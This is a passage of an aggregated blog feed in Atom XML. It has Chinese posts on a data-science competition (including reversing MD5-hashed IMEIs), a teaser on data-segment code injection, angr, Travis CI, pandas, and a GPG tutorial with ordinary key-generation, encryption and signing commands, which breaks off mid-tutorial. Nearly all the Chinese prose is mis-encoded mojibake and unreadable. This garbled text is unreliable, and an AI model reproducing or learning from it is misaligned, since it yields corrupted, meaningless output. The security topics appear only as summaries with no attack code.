title="ÊÄªÁªì"></a>ÊÄªÁªì</h1><p>ËßÇÁúãÁé∞Âú∫Ââç‰∏âÁöÑÁ≠îËæ©ÔºåÊÄª‰ΩìÊÄùË∑Ø‰∏äÂ§ßÂÆ∂ÈÉΩÂ∑Æ‰∏çÂ§ö„ÄÇÁ¨¨‰∏âÂêçÈòü‰ºçÂ∞èÂÖîÂ≠ê‰πñ‰πñÈááÁî®‰∫Ü‚Äú‰º™Ê†áÁ≠æ‚ÄùÔºåÂ∞ÜÊµãËØïÈõÜÂΩì‰∏≠È¢ÑÊµãÊ¶ÇÁéáÂÄºÂ§ß‰∫é0.999ÁöÑ‰Ωú‰∏∫Ê≠£Ê†∑Êú¨ÔºåÂ∞è‰∫é0.001ÁöÑ‰Ωú‰∏∫Ë¥üÊ†∑Êú¨Âä†ÂÖ•Âà∞ËÆ≠ÁªÉÈõÜÈáçÊñ∞ËÆ≠ÁªÉÔºåÊèêÈ´ò‰∫ÜËÆ≠ÁªÉÈõÜÁöÑÊï∞ÊçÆÈáèÔºåËøô‰∏ÄÂÅöÊ≥ï‰ΩøÂæóÊ®°ÂûãÊïàÊûúÊèêÈ´ò‰∫Ü0.0035Â∑¶Âè≥„ÄÇÁ¨¨‰∏ÄÂêçÁõ¥Êé•ÊòØ‰∏Ä‰∏™ÂÖ¨Âè∏ÁªÑÁöÑÈòü‰ºçÔºåÂÖ∂‰∏ªË¶Å‰∫ÆÁÇπÂ∞±Âú®‰∫éÈÄöËøáÈÉ®ÂàÜÊúâËßÑÂàôÁ¢∞ÊíûÁöÑÊñπÂºèËøòÂéü MD5 Âä†ÂØÜ‰∫ÜÁöÑ imeiÔºåÁÑ∂ÂêéÂØπËøòÂéüÂêéÁöÑ imei ËøõË°åÊà™Êñ≠ÔºåÂÖ∑‰ΩìÊµÅÁ®ãËßÅ‰∏ãÂõæ„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/imei%E7%A2%B0%E6%92%9E1.png" alt="imei ÈÄÜÂêë1" title="">                </div>                <div class="image-caption">imei ÈÄÜÂêë1</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/imei%E7%A2%B0%E6%92%9E2.png" alt="imei ÈÄÜÂêë2" title="">                </div>                <div class="image-caption">imei ÈÄÜÂêë2</div>            </figure></div><h1 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h1><ul><li><a href="https://www.zhihu.com/question/364517083" target="_blank" rel="noopener">DNNÂèØ‰ª•ËøõË°åÈ´òÈò∂ÁâπÂæÅ‰∫§‰∫íÔºå‰∏∫‰ªÄ‰πàWide&amp;DeepÂíåDeepFMÁ≠âÊ®°Âûã‰ªçÁÑ∂ÈúÄË¶ÅÊòæÂºèÊûÑÈÄ†WideÈÉ®ÂàÜÔºü</a></li><li><a href="https://1024.iflytek.com/h5/" target="_blank" rel="noopener">Áé∞Âú∫ÂÜ≥ËµõÂΩïÊí≠</a></li></ul>]]></content>
        <author>
            <name><![CDATA[LogicJake‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2020/04/18/data-infector/</id>
        <title><![CDATA[data ÊÆµ‰ª£Á†ÅÊ≥®ÂÖ•]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2020/04/18/data-infector/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2020/04/18/data-infector/"><![CDATA[<p>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂêë data ÊÆµÂä´ÊåÅ‰ª£Á†ÅÂπ∂Â∞ÜÁ®ãÂ∫èÁöÑËøêË°åÊµÅÂä´ÊåÅÂà∞ËøôÈáåÂÆûÁé∞Êàë‰ª¨Â∏åÊúõÁöÑÂäüËÉΩÔºàÂåÖÊã¨ÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å„ÄÅËΩØ‰ª∂‰øùÊä§Á≠âÔºâ„ÄÇËøô‰∏ÄËøáÁ®ã‰∏≠ÂèØËÉΩÊòØÊúÄÂ§çÊùÇ‰πüÊòØÊúÄÈáçË¶ÅÁöÑÈÉ®ÂàÜÂ∞±ÊòØÊÄéÊ†∑Â∞ÜÊñ∞Â¢ûÁöÑ‰ª£Á†ÅÊ≥®ÂÖ•Âà∞ data ÊÆµ‰∏≠‰∫Ü„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[QRZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/12/31/my-2019/</id>
        <title><![CDATA[ÊàëÁöÑ 2019 ÊÄªÁªì]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/12/31/my-2019/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/12/31/my-2019/"><![CDATA[<p>Â≠¶‰π†‰∏Ä‰∏ãËµµÁ•ûÂÅö‰∏Ä‰∏ãÂπ¥ÁªàÊÄªÁªìÔºåËôΩÁÑ∂Ëá™Â∑±ÂæàËèúÂ∞±ÊòØÂï¶„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[QRZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/</id>
        <title><![CDATA[angr ÂÖ•Èó®Ôºà‰∏âÔºâ]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/"><![CDATA[<p>Êú¨ÁØá‰∏ªË¶ÅËÆ∞ÂΩï‰∫ÜÊñ∞Êâã‰ΩøÁî® angr ÂØπÂÜÖÂ≠òÂíåÂØÑÂ≠òÂô®Êìç‰ΩúÁöÑËÆ∞ÂΩï„ÄÇÈ¢òÁõÆÂàÜÊûêÈ°∫Â∫èÂèÇËÄÉ‰∫ÜËøôÁØáÊñáÁ´†Ôºö<a href="https://xz.aliyun.com/t/4052" target="_blank" rel="noopener">Ê∑±ÂÖ•ÊµÖÂá∫angrÔºà‰∏âÔºâ</a></p>]]></content>
        <author>
            <name><![CDATA[QRZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/</id>
        <title><![CDATA[‰ΩøÁî® Travis CI Ëá™Âä®ÈÉ®ÁΩ≤ Hexo ÂçöÂÆ¢]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/"><![CDATA[<p>ÊúÄËøë‰∏ÄÁõ¥Âú® Manjaro Âíå Windows ‰πãÈó¥ÂàáÊç¢ÔºåÁé∞Âú®Â≠¶‰π†ÈÉΩÂ∑≤ÁªèÂú® Manjaro ‰∏äËøõË°å‰∫ÜÔºå‰ΩÜÊòØÂçöÂÆ¢ËøòÂú® Windows ‰∏ä„ÄÇËôΩÁÑ∂ËøÅÁßªËøáÊù•Âπ∂‰∏çÈöæÔºå‰ΩÜËøòÊòØÂ§™È∫ªÁÉ¶‰∫Ü„ÄÇÂè¶Â§ñÂÜôÂçöÂÆ¢ËøòË¶ÅÂºÄÁîµËÑëÔºåÁöÑÁ°ÆÊúâÁÇπÈ∫ªÁÉ¶„ÄÇ‰Ωú‰∏∫‰∏Ä‰∏™Êáí‰∫∫ÂΩìÁÑ∂ÊòØÂä®Âä®ÊâãËá™Âä®Êé®ÈÄÅÊúÄÂ•ΩÔºåÊàëÂ∞±ÊÉ≥Âà∞‰∫ÜÁî® <a href="https://travis-ci.org/" target="_blank" rel="noopener">Travis CI</a> Êù•Ëá™Âä®ÈÉ®ÁΩ≤ÂçöÂÆ¢„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[QRZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/</id>
        <title><![CDATA[angr ÂÖ•Èó®Ôºà‰∫åÔºâ]]></title>
        <updated>2020-04-18T13:31:53+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/"><![CDATA[<p>ËøôÈáåÊõ¥Ëøõ‰∏ÄÊ≠•Âú∞Â≠¶‰π†‰∫Ü angr ÁöÑ‰∏Ä‰∫õÁü•ËØÜÁÇπ„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[QRZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/17/DataScience_10MinutesToPandas/</id>
        <title><![CDATA[Êï∞ÊçÆÁßëÂ≠¶ | ÂçÅÂàÜÈíüÂÖ•Èó®pandas/Â∏∏Áî®ÊñπÊ≥ïÁ¨îËÆ∞]]></title>
        <updated>2020-04-17T18:36:32+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/17/DataScience_10MinutesToPandas/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/17/DataScience_10MinutesToPandas/"><![CDATA[ÊúÄËøëÂØπÊï∞ÊçÆÁßëÂ≠¶ÊúâÁÇπÊÑüÂÖ¥Ë∂£ÔºåÊ≠£Â•ΩË¶ÅÁî®Âà∞pandasÔºå‰∫éÊòØÂ∞±ÁøªËØë‰∫Ü‰∏Ä‰∏ãÂÆòÊñπÁöÑ10 Minutes to pandasÔºåÈ°∫‰æøËÆ∞‰∫ÜÁÇπÁ¨îËÆ∞Âêß„ÄÇ]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/gpg/</id>
        <title><![CDATA[GPG‰ΩøÁî®Á¨îËÆ∞]]></title>
        <updated>2020-04-02T06:47:31+08:00</updated>
        <link href="https://blog.creedowl.com/posts/gpg/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/gpg/"><![CDATA[<h2 id="why-gpg">Why GPG?</h2>
<p><a href="https://zh.wikipedia.org/wiki/GnuPG">GPG</a> ÊòØ‰∏Ä‰∏™ÂØÜÁ†ÅÂ≠¶ËΩØ‰ª∂ÔºåÁî®‰∫éÂä†ÂØÜ„ÄÅÁ≠æÂêçÈÄö‰ø°ÂÜÖÂÆπÂèäÁÆ°ÁêÜÈùûÂØπÁß∞ÂØÜÁ†ÅÂ≠¶ÁöÑÂØÜÈí•ÔºåÂÖ∑‰ΩìÂéÜÂè≤„ÄÅ‰ªãÁªçÂèØ‰ª•Âú®wiki‰∏≠ÁúãÂà∞Ôºå<a href="https://gnupg.org/">ÂÆòÁΩë</a></p>
<p>ËÄåÊàë‰ΩøÁî® GPG ÁöÑÁºòÁî±ÊòØÔºåÂú® Github ‰∏äÊèê‰∫§Êó∂ÔºåÂ¶ÇÊûú‰ΩøÁî® GPG ÂØπÊèê‰∫§ËøõË°åÁ≠æÂêçÔºå‰ºöÊúâ‰∏Ä‰∏™<code>Verified</code>Ê†áËØÜ<del>ÁúãËµ∑Êù•Âæànb</del></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585795152275.png/compress" alt="UTOOLS1585795152275.png"></p>
<p>ÂΩìÁÑ∂‰ΩøÁî® GPG ‰∏ç‰ªÖÊòØ‰∏∫‰∫ÜÂ•ΩÁúãÔºåÂÆÉËÉΩÁ°Æ‰øù‰Ω†Êèê‰æõÁöÑ‰ø°ÊÅØÊòØÁî±‰Ω†Ëá™Â∑±ÂèëÂ∏ÉÁöÑÔºåÊó†Ê≥ïË¢´Âà´‰∫∫ÁØ°Êîπ„ÄÅÂÜíÂÖÖÔºåÂâçÊèêÊòØ‰øùÊä§Â•ΩËá™Â∑±ÁöÑ GPG ÁßÅÈí•</p>
<h2 id="ÂÆâË£Ö">ÂÆâË£Ö</h2>
<p>ËøôËæπ‰ª• MacOS ‰∏∫Á§∫‰æãËøõË°åÊìç‰Ωú</p>
<p><strong>Âº∫ÁÉàÂª∫ËÆÆ MacOS Áî®Êà∑‰ΩøÁî® <a href="https://gpgtools.org/">GPG Suite</a> ËøõË°åÊìç‰ΩúÔºåÂèØ‰ª•ÈÅøÂÖç‰∏Ä‰∫õÂ•áÂ•áÊÄ™ÊÄ™ÁöÑÈóÆÈ¢ò</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div><p><del>‰ªÖÂÆâË£Ö GPG Êú¨‰Ωì</del></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># deprecated</span>
brew install gpg
</code></pre></div><h2 id="ÁîüÊàêÂØÜÈí•">ÁîüÊàêÂØÜÈí•</h2>
<p>GPG ÈááÁî®ÈùûÂØπÁß∞Âä†ÂØÜÔºå‰∏ÄÂàáÁöÑÊìç‰ΩúÈÉΩÈúÄË¶ÅÊúâÂØÜÈí•„ÄÇÁΩë‰∏ä‰∏Ä‰∫õÊïôÁ®ã‰∏≠ÁöÑÊìç‰Ωú‰∏éÊàë‰ΩøÁî®ÁöÑ GPG ÁâàÊú¨ <code>gpg (GnuPG/MacGPG2) 2.2.17</code> ÊúâÁÇπÂá∫ÂÖ•Ôºå‰ª•‰∏ãÊìç‰ΩúÈÉΩÂú®ÊàëÊâÄ‰ΩøÁî®ÁöÑÁâàÊú¨‰∏ãËøõË°å</p>
<p>Êúâ‰∏§‰∏™ÂëΩ‰ª§Áî®‰∫éÁîüÊàêÂØÜÈí•Ôºå‰∏∫<code>gpg --gen-key</code>Âíå<code>gpg --full-gen-key</code>ÔºåÂå∫Âà´ÊòØÂâçËÄÖÈááÁî®ÈªòËÆ§ÁöÑÈÖçÁΩÆ‰∏çÂèØÊõ¥ÊîπÔºåÂêéËÄÖËÉΩËá™ÂÆö‰πâÈÖçÁΩÆ„ÄÇÊàë‰ª¨ÈááÁî®Âêé‰∏ÄÁßçÔºåÈ¶ñÂÖàÈÄâÊã©ÂØÜÈí•Á±ªÂûãÔºåÈªòËÆ§ÁöÑ<code>1</code>Â∞±ÂèØ‰ª•‰∫Ü</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ gpg --full-gen-key
gpg <span class="o">(</span>GnuPG/MacGPG2<span class="o">)</span> 2.2.17<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

ËØ∑ÈÄâÊã©ÊÇ®Ë¶Å‰ΩøÁî®ÁöÑÂØÜÈí•Á±ªÂûãÔºö
   <span class="o">(</span>1<span class="o">)</span> RSA Âíå RSA ÔºàÈªòËÆ§Ôºâ
   <span class="o">(</span>2<span class="o">)</span> DSA Âíå Elgamal
   <span class="o">(</span>3<span class="o">)</span> DSAÔºà‰ªÖÁî®‰∫éÁ≠æÂêçÔºâ
   <span class="o">(</span>4<span class="o">)</span> RSAÔºà‰ªÖÁî®‰∫éÁ≠æÂêçÔºâ
ÊÇ®ÁöÑÈÄâÊã©ÊòØÔºü <span class="m">1</span>
</code></pre></div><p>Êé•ÁùÄÈÄâÊã©ÂØÜÈí•ÈïøÂ∫¶ÔºåÈªòËÆ§<code>2048</code>Âç≥ÂèØ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">RSA ÂØÜÈí•ÁöÑÈïøÂ∫¶Â∫îÂú® 1024 ‰Ωç‰∏é 4096 ‰Ωç‰πãÈó¥„ÄÇ
ÊÇ®ÊÉ≥Ë¶Å‰ΩøÁî®ÁöÑÂØÜÈí•ÈïøÂ∫¶Ôºü(2048) 2048
</code></pre></div><p>ÁÑ∂ÂêéËÆæÂÆöÂØÜÈí•ÁöÑÊúâÊïàÊúüÈôêÔºåÊàë‰ª¨Ê≤°ÊúâÁâπÊÆäÈúÄÊ±ÇÔºåËÆæÁΩÆÊ∞∏‰∏çËøáÊúüÂç≥ÂèØ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">ËØ∑ËÆæÂÆöËøô‰∏™ÂØÜÈí•ÁöÑÊúâÊïàÊúüÈôê„ÄÇ
         0 = ÂØÜÈí•Ê∞∏‰∏çËøáÊúü
      &lt;n&gt;  = ÂØÜÈí•Âú® n Â§©ÂêéËøáÊúü
      &lt;n&gt;w = ÂØÜÈí•Âú® n Âë®ÂêéËøáÊúü
      &lt;n&gt;m = ÂØÜÈí•Âú® n ÊúàÂêéËøáÊúü
      &lt;n&gt;y = ÂØÜÈí•Âú® n Âπ¥ÂêéËøáÊúü
ÂØÜÈí•ÁöÑÊúâÊïàÊúüÈôêÊòØÔºü(0) 0
</code></pre></div><p>Á°ÆËÆ§‰∏äËø∞ËÆæÁΩÆÂêéÔºå‰æùÊ¨°ËæìÂÖ•ÂßìÂêç„ÄÅÈÇÆÁÆ±ÂíåÊ≥®ÈáäÔºåËøôÈáåÊàë‰ΩøÁî®ÈöèÊú∫‰ø°ÊÅØÁî®‰∫éÊºîÁ§∫</p>
<pre><code>GnuPG ÈúÄË¶ÅÊûÑÂª∫Áî®Êà∑Ê†áËØÜ‰ª•Ëæ®ËÆ§ÊÇ®ÁöÑÂØÜÈí•„ÄÇ

ÁúüÂÆûÂßìÂêçÔºö naive
ÁîµÂ≠êÈÇÆ‰ª∂Âú∞ÂùÄÔºö naive@test.com
Ê≥®ÈáäÔºö too young too simple
ÊÇ®ÈÄâÂÆö‰∫ÜÊ≠§Áî®Êà∑Ê†áËØÜÔºö
    ‚Äúnaive (too young too simple) &lt;naive@test.com&gt;‚Äù

Êõ¥ÊîπÂßìÂêçÔºàNÔºâ„ÄÅÊ≥®ÈáäÔºàCÔºâ„ÄÅÁîµÂ≠êÈÇÆ‰ª∂Âú∞ÂùÄÔºàEÔºâÊàñÁ°ÆÂÆöÔºàOÔºâ/ÈÄÄÂá∫ÔºàQÔºâÔºü
</code></pre>
<p>Á°ÆÂÆöÂêéÔºåÈúÄË¶ÅËÆæÂÆöÂØÜÈí•ÁöÑÂØÜÁ†ÅÔºåÂ¶ÇÊûú‰Ω†ÈááÁî®‰∫Ü <code>GPG Suite</code> Ôºå‰ºöÂá∫Áé∞‰∏Ä‰∏™Á™óÂè£ÔºåÂú®Ê≠§ËæìÂÖ•ÂØÜÁ†Å</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585796741624.png/compress" alt="UTOOLS1585796741624.png"></p>
<p>Â¶ÇÊûúÊ≤°‰ΩøÁî®<code>GPG Suite</code>ÔºåÂàô‰ºöÂú®‰Ω†ÂΩìÂâçÁªàÁ´ØÂºπÂá∫‰∏Ä‰∏™ÂÖ®Â±èÁªàÁ´ØÁ™óÂè£ÔºåÂêåÊ†∑ÊòØËæìÂÖ•ÂØÜÁ†Å„ÄÇ</p>
<blockquote>
<p>Ê≥®ÊÑèÔºåÂú® mac ÁªàÁ´ØÁéØÂ¢É‰∏ãÔºåÂ¶ÇÊûúËØ≠Ë®ÄÊòØ‰∏≠ÊñáÁöÑËØùÔºåËøô‰∏™ÁªàÁ´ØÁ™óÂè£ÂèØËÉΩ‰ºö‰π±Á†ÅÔºå‰ΩÜ‰∏çÂΩ±Âìç‰ΩøÁî®Ôºå‰πüÂèØ‰ª•‰∏¥Êó∂ËÆæÁΩÆËØ≠Ë®Ä‰∏∫Ëã±ÊñáËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò<code>LANGUAGE=en gpg --full-generate-key</code>„ÄÇ‰ΩÜÂçÉ‰∏á‰∏çË¶ÅÁî®<code>ctrl-c</code>ÁªìÊùüËøô‰∏™ËøõÁ®ãÔºåËøô‰ºöÁ†¥ÂùèÂΩìÂâçÁªàÁ´ØÁéØÂ¢ÉÔºåÂêéÈù¢ÁöÑËæìÂÖ•‰ºöÂèòÂæóÂæàÂ•áÊÄ™ÔºåËÄå‰∏îÂêéÂè∞ËøõÁ®ã‰∏ç‰ºöÁªìÊùüÔºå‰ºöÂç†Êª°‰Ω†ÁöÑCPU</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Êàë‰ª¨ÈúÄË¶ÅÁîüÊàêÂ§ßÈáèÁöÑÈöèÊú∫Â≠óËäÇ„ÄÇÂú®Ë¥®Êï∞ÁîüÊàêÊúüÈó¥ÂÅö‰∫õÂÖ∂‰ªñÊìç‰ΩúÔºàÊï≤ÊâìÈîÆÁõò
„ÄÅÁßªÂä®Èº†Ê†á„ÄÅËØªÂÜôÁ°¨Áõò‰πãÁ±ªÁöÑÔºâÂ∞Ü‰ºöÊòØ‰∏Ä‰∏™‰∏çÈîôÁöÑ‰∏ªÊÑèÔºõËøô‰ºöËÆ©ÈöèÊú∫Êï∞
ÂèëÁîüÂô®ÊúâÊõ¥Â•ΩÁöÑÊú∫‰ºöËé∑ÂæóË∂≥Â§üÁöÑÁÜµ„ÄÇ
gpg: ÂØÜÈí• 4C26D2E451FFDAF1 Ë¢´Ê†áËÆ∞‰∏∫ÁªùÂØπ‰ø°‰ªª
gpg: ÁõÆÂΩï‚Äò/Users/creedowl/.gnupg/openpgp-revocs.d‚ÄôÂ∑≤ÂàõÂª∫
gpg: ÂêäÈîÄËØÅ‰π¶Â∑≤Ë¢´Â≠òÂÇ®‰∏∫‚Äò/Users/creedowl/.gnupg/openpgp-revocs.d/0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1.rev‚Äô
ÂÖ¨Èí•ÂíåÁßÅÈí•Â∑≤ÁªèÁîüÊàêÂπ∂Ë¢´Á≠æÂêç„ÄÇ

pub   rsa2048 2020-04-02 [SC]
      0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1
uid                      naive (too young too simple) &lt;naive@test.com&gt;
sub   rsa2048 2020-04-02 [E]
</code></pre></div><p>ËøôÊ†∑ÔºåÂØÜÈí•Â∞±ÁîüÊàêÂÆåÊàêÔºåÂÖ∂‰∏≠<code>4C26D2E451FFDAF1</code>Â∞±ÊòØ‰Ω†ÁöÑÂØÜÈí•ÂêçÔºåÂêéÁª≠Êìç‰ΩúÈÉΩÈúÄË¶ÅÈÄöËøáËøô‰∏™ÂØÜÈí•ÂêçÈÄâÊã©ÂØÜÈí•Ôºå‰ΩÜ‰πüÂèØ‰ª•ÈÄöËøá‰πãÂâçËÆæÁΩÆÁöÑÂßìÂêçÊàñÈÇÆÁÆ±‰ª£ÊõøÊìç‰Ωú</p>
<h2 id="gpg-Â∏∏Áî®Êìç‰Ωú">GPG Â∏∏Áî®Êìç‰Ωú</h2>
<p>GPG ÊúÄÂü∫Á°ÄÁöÑÊìç‰ΩúÂ∞±ÊòØÂØπÊñá‰ª∂Á≠â‰ø°ÊÅØËøõË°åÂä†ÂØÜ„ÄÅÁ≠æÂêçÔºåÈ¶ñÂÖàÂàõÂª∫‰∏Ä‰∏™ÊµãËØïÊñá‰ª∂<code>test.txt</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nb">test</span> &gt; test.txt
</code></pre></div><h3 id="Âä†ÂØÜ">Âä†ÂØÜ</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --recipient creedowl --output test.txt.gpg --encrypt test.txt
</code></pre></div><p>ÂÖ∂‰∏≠<code>--recipient</code>ÊåáÂÆöÊé•Êî∂ËÄÖÔºåÁÆÄÂÜô‰∏∫<code>-r</code>ÔºåËÆæÂÆöÊé•ÂèóËÄÖÊó∂ÈúÄË¶Å‰Ω†Êú¨Âú∞ÊúâÊé•Êî∂ËÄÖÁöÑ<strong>ÂÖ¨Èí•</strong>ÔºåÂèØ‰ª•Áî®ÂØÜÈí•Âêç„ÄÅÂßìÂêçÊàñËÄÖÈÇÆÁÆ±ËøõË°åÊåáÂÆö„ÄÇ<code>--output</code>ÊåáÂÆöËæìÂá∫Êñá‰ª∂ÂêçÔºåÂèØÁúÅÁï•„ÄÇ<code>--encrypt</code>ÊåáÂÆöÂæÖÂä†ÂØÜÁöÑÊñá‰ª∂ÔºåÁÆÄÂÜô‰∏∫<code>-e</code>„ÄÇËøôÊ†∑Âú®‰Ω†ÂΩìÂâçÁõÆÂΩï‰∏ã‰ºöÁîüÊàê‰∏Ä‰∏™<code>test.txt.gpg</code>Âç≥Âä†ÂØÜÂêéÁöÑÊñá‰ª∂Ôºå‰Ω†Â∞±ÂèØ‰ª•ÊääËøô‰∏™Êñá‰ª∂ÂèëÈÄÅÁªôÊé•ÂèóËÄÖÔºå‰∏çÂøÖÊãÖÂøÉÊñá‰ª∂ÂÜÖÂÆπË¢´Á¨¨‰∏âÊñπËØªÂèñ</p>
<p><strong>Ê≥®ÊÑè</strong>ËøôÈáåÁîüÊàêÂä†ÂØÜÊñá‰ª∂‰∏∫‰∫åËøõÂà∂Ê†ºÂºèÔºåÊúâÊó∂ÂÄôÔºàÂ¶ÇÈÄöËøáÈÇÆ‰ª∂ÂèëÈÄÅÔºâ‰∏ç‰æø‰∫éÊìç‰ΩúÔºåÂèØ‰ª•Âä†‰∏ä<code>--armor</code>ÂèÇÊï∞ÔºàÁÆÄÂÜô‰∏∫<code>-a</code>ÔºâÁîüÊàêÊñáÊú¨Ê†ºÂºèÁöÑÂØÜÊñáÔºåÂ¶Ç</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -r creedowl -ae test.txt
</code></pre></div><p>ÁîüÊàêÁöÑÂä†ÂØÜÊñá‰ª∂‰∏∫<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP MESSAGE-----

hQEMA9KmvDhAMTGrAQf+KITqx4HTpWsevIEfRFlw5g+jt8l8ol3fuww0gBoMEPBG
KaqxCmjIpHZdGmaXwBSKadmeieZGLsm1CYuf4gbv4FpdWgveVWnLvB/HmwuvnmJt
YhTtapNgkQ++mwPbH4WKeOFQ58U5dZ7C+R8rrucRRYQBRTH6AJQY82aV1KXTqyF1
D8c/2ANW7aCWr8W/ogCbEqH47VE3foP+aSD+JMPtdnaYWIPzyr5x5lw6ASwxD4hB
ikOUcJTxp+GyFLTd3n1zCvSP9ZQzvolur7soqZVP8t4hxlALGL+KYN4YgubcPt5y
bucMYWkbLlZM+AuAYzSCLaSmkgkiYUFEkwKJWdLr+NJGAY5Mk+bnEP2k/kKxl9vo
/LVsloiYbg9M184LxUNfZRBnKcI9vKw/C6uU2Ee5wKUMsy3Epnp60Fe5u5fj5yn7
0JjMBmY+gQ==
=8K/i
-----END PGP MESSAGE-----
</code></pre></div><h3 id="Ëß£ÂØÜ">Ëß£ÂØÜ</h3>
<p>Êúâ‰∫ÜÂØÜÊñáÂ∞±Ë¶ÅÂØπÂÖ∂ËøõË°åËß£ÂØÜÂæóÂà∞ÂéüÊñá„ÄÇÊ≥®ÊÑèË¶ÅËøõË°åËß£ÂØÜÔºå‰Ω†ÂøÖÈ°ªÊúâÊé•ÂèóËÄÖÁöÑ<strong>ÁßÅÈí•</strong>„ÄÇÂÖ¨Èí•ÊòØÂÖ¨ÂºÄÁöÑÔºå‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•Êü•Áúã„ÄÅ‰ΩøÁî®ÔºåËÄå<strong>ÁßÅÈí•</strong>ÊòØÁßÅÊúâÁöÑÔºå‰∏ÄÂÆöË¶Å‰øùÁÆ°Â•ΩÔºåÂ¶ÇÊûúÊ≥ÑÈú≤‰∫ÜËøô‰∏™ GPG ÂØÜÈí•Â∞±Á≠âÂêå‰∫éÂ§±Êïà‰∫ÜÔºåÈúÄË¶ÅÂêäÈîÄ„ÄÇËøôÂ∞±ÊòØÈùûÂØπÁß∞Âä†ÂØÜ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">	gpg --decrypt test.txt.asc --output out.txt
</code></pre></div><p>ÂÖ∂‰∏≠<code>--decrypt</code>Â£∞ÊòéËØ•ÂëΩ‰ª§ËøõË°åËß£ÂØÜÔºåÁÆÄÂÜô‰∏∫<code>-d</code>Ôºå<code>--output</code>ÊåáÂÆöËæìÂá∫Êñá‰ª∂ÔºåÈªòËÆ§ËæìÂá∫Âà∞ÁªàÁ´Ø„ÄÇÊ≥®ÊÑèËß£ÂØÜÊó∂ÈúÄË¶ÅËæìÂÖ•‰Ω†ÂØÜÈí•ÁöÑÂØÜÁ†ÅÔºåÊâÄ‰ª•‰πü‰∏ÄÂÆöË¶Å‰øùÁÆ°Â•ΩÂØÜÁ†Å</p>
<h3 id="Á≠æÂêç">Á≠æÂêç</h3>
<p>ÊúâÁöÑÊó∂ÂÄô‰∏çÈúÄË¶ÅÂØπÊñá‰ª∂ËøõË°åÁ≠æÂêçÔºåÂè™ÈúÄË¶ÅÁ°Æ‰øùÊñá‰ª∂ÊòØÁî±Êú¨‰∫∫ÂèëÂá∫ÁöÑÔºåËøô‰∏™Êó∂ÂÄôÂ∞±ÂèØ‰ª•Áî®Âà∞Á≠æÂêç</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --sign test.txt
